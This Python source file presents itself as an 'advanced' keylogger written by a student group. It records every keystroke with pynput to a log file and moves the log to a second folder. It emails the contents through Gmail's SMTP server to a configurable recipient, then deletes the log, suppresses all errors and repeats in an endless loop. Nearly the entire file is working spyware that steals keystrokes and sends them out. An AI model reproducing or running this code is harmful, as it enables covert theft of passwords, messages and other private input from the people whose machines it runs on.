'''
This is the advanced version of key logger
created by "Decoders Society"
version 0.0.1
Head Developer :       Nikhil Mohan
Assistant Developer : Priyanshu shukla,Prantu Dixit
Mentor : Divyansh Bhardwaj
Instution :Gla University (Mathura)
Do not forget to change email id in line  53,54
'''
#Function for key_logger
def key_logger ():
    from pynput.keyboard import Listener
    def wtf(key):
        letter = str(key)
        letter = letter.replace("'", "")
        if letter == 'Key.space':
            letter = " "
        if letter == 'Key.enter':
            letter = "\n"
        if letter == 'Key.esc':
            letter='<esc>'
        if letter =='Key.backspace':
            letter='\b'

        with open("log.txt", "a") as f:
            f.write(letter)

    with Listener(on_press=wtf) as l:
        l.join()
#Function for moving files so that they might not get overwritted
def move():
    import os
    try:
        z = open("C:/Users/nmkni/PycharmProjects/key log/log.txt", "r")
        x = z.read()
        c = open("C:/Users/nmkni/PycharmProjects/key log/b/log.txt", "a")
        c.write(x)
        z.close()
        c.close()
        os.remove("C:/Users/nmkni/PycharmProjects/key log/log.txt")
    except:
        ''
#Function for sending E-mail
def email():
    import os
    import smtplib
    from email.mime.text import MIMEText
    try:
        filepath = 'C:/Users/nmkni/PycharmProjects/key log/b/log.txt'
        with open(filepath, 'r') as f:
            text = MIMEText(f.read())
            text.add_header('',
                            '',
                            filename=os.path.basename(filepath))

            s = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            s.login('senders email address', 'senders email password ')
            s.sendmail('', 'Recivers email address', text.as_string())
            os.remove("C:/Users/nmkni/PycharmProjects/key log/b/log.txt")

    except:
        ''
# Loop for continiously execution of all the function
while(1):
    move()
    email()
    key_logger()

'''
if you encounter any error in code please contact nikhil.mohan_cs18@gla.ac.in
if find any bug in code please send to above email for modifications
'''

